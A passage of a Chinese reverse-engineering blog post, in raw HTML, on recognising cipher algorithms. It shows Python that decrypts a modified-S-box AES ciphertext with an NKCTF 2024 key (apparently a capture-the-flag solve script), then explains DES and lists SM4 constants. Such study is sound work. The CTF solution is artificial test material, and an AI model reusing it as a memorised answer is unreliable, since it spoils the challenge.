class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>                <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br><br>S_box = [<br>    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>    <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>    <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>    <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>    <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>    <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>    <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span><br>]<br><br>new_s_box = [<span class="hljs-number">0x31</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>,<br>             <span class="hljs-number">0x53</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x78</span>,<br>             <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x5B</span>,<br>             <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA5</span>,<br>             <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC0</span>,<br>             <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x87</span>,<br>             <span class="hljs-number">0x94</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xCC</span>,<br>             <span class="hljs-number">0x86</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>,<br>             <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x64</span>,<br>             <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xB6</span>,<br>             <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xE5</span>,<br>             <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xF0</span>,<br>             <span class="hljs-number">0x32</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xA8</span>,<br>             <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1C</span>,<br>             <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFD</span>]<br><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    line = (new_s_box[i] &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span><br><br>    rol = new_s_box[i] &amp; <span class="hljs-number">0xf</span><br><br>    new_contrary_sbox[(line * <span class="hljs-number">16</span>) + rol] = i<br><br><span class="hljs-built_in">print</span>(new_contrary_sbox)<br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;B0CC93EAE92FEF5699396E023B4F9E42&#x27;</span>)<br><span class="hljs-built_in">print</span>(IInput)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;user01_nkctf2024&#x27;</span>)<br><span class="hljs-built_in">print</span>(Cipher_Key)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br></code></pre></td></tr></table></figure><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>对称密码，DES使用64位的密钥和64位的明文块进行加密。DES算法的分组大小是64位，因此，如果需要加密的明文长度不足64位，需要进行填充；如果明文长度超过64位，则需要使用分组模式进行分组加密</p><p><strong>识别主要靠常量</strong></p><h2 id="初始置换-IP置换"><a href="#初始置换-IP置换" class="headerlink" title="初始置换(IP置换)"></a>初始置换(IP置换)</h2><p>将输入的64位明文块进行置换和重新排列，生成新的64位数据块</p><p>目的:增加加密的混乱程度，使明文中的每一位都能够对后面的加密过程产生影响，提高加密强度</p><p>我们将把64位的顺序按下表中规定的顺序放置，图中的数字是在64位明文中每个比特的索引位置</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071400888-30529eea-1dbf-4aed-99b6-19d64f855758.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1727531578705-8594fe2a-08e7-46a4-a7b6-e356c9a8929c.png" class="" title="img"><h2 id="加密轮次"><a href="#加密轮次" class="headerlink" title="加密轮次"></a>加密轮次</h2><p>初始置换完成后，明文被划分成了相同长度（32位）的左右两部分，记作L0,R0。接下来就会进行16个轮次的加密</p><p>从单独一个轮次来看，首先把目光聚焦在R0这里。右半部分R0会作为下一轮次的左半部分L1的输入。其次，R0会补位到48位和本轮次生成的48位K0输入到F轮函数中去。F函数的输出结果为32位，结果F(R0,K0)会和L0进行异或运算作为下一轮次右半部分R1的输入</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071541210-ea7a4a4d-ec16-4ba0-9181-4e2d4759b699.png" class="" title="img"><p>以此类推，重复16轮运算</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071672214-90ee84c9-fa8b-40b7-8f20-cfbbbfb680a5.png" class="" title="img"><h3 id="拓展R到48位"><a href="#拓展R到48位" class="headerlink" title="拓展R到48位"></a>拓展R到48位</h3><p>将32位的R0右半部分进行扩展，得到一个48位的数据块。同样的，数据拓展也是根据一个固定的置换表。红框中就是我们要补位的数据</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071810598-38955c99-d8a5-4220-bf79-8d787629cae6.png" class="" title="img"><p>由此可见，扩展过程的每一位都是根据上述的置换表从输入的32位数据块中提取出来的。原始数据的第32位被补充到了新增列的第一个，第5位被补充到了第二个新增列的第一个，以此类推</p><h3 id="子密钥k的生成"><a href="#子密钥k的生成" class="headerlink" title="子密钥k的生成"></a>子密钥k的生成</h3><p>DES算法采用了每轮子密钥生成的方式来增加密钥的复杂性和安全性。每轮子密钥都是由主密钥（64位）通过密钥调度算法（Key Schedule Algorithm）生成的。DES算法的密钥调度算法可以将64位的主密钥分成16个子密钥，每个子密钥48位，用于每轮加密中与输入数据进行异或运算</p><p>通过子密钥生成的流程图来看下整个过程</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694071939493-34bc8cab-2bd7-499c-9561-b8d15aaeee79.png" class="" title="img"><p>主密钥，下面56位是已经删除以8为倍数的奇偶校验位</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694079312722-d977fff3-3ac0-4f72-bbbe-ed5fa934945b.png" class="" title="img"><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>当前轮次的子密钥Ki（在上面56位的基础上删除特定的8位，得到48位）与拓展的48位Ri进行异或运算。运算结果会作为接下来S盒替换的输入</p><h3 id="S盒替换"><a href="#S盒替换" class="headerlink" title="S盒替换"></a>S盒替换</h3><p>用于将上一轮异或运算的48位结果映射到32位输出中去</p><p>6位变4位，首尾两位作为行标，中间四位作为列标，去不同的S盒对应一个小于16的数，再转化为4位二进制数</p><h3 id="P盒代换"><a href="#P盒代换" class="headerlink" title="P盒代换"></a>P盒代换</h3><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072162715-e2efba05-73c8-471a-96b2-35f24616460c.png" class="" title="img"><p>P盒代换将S盒替换的32位输出作为输入，经过上述固定的代换表进行代换后即为最后F轮函数的结果</p><h2 id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a>逆置换</h2><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072214847-8f04ca31-871f-49b7-b019-c02f3d928acd.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694078794302-44b2c0af-77ce-4b5e-8ac4-ab7cbe969fde.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694078824080-db4d1e9d-a053-45a6-bab4-85da101f2769.png" class="" title="img"><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>3DES顾名思义，就i是使用DES加密3次，使用3个密钥进行加解密</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694072338044-c6e05c74-0d2e-476d-8de2-d0bb36fe6169.png" class="" title="img"><h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>常数<code>0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc</code></p><p>分组密码，分组长度128位，密钥长度128位，32轮迭代和一次反序变换，输入4字（16字节，换算方法是密码算法特有的）</p><p>分为密钥拓展和加&#x2F;解密两个模块，下图是 SM4 的加解密（左）和密钥拓展（右）的流程图</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707701871151-2c6db9da-3ca6-4ad3-b3cc-538572671725.png" class="" title="img"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 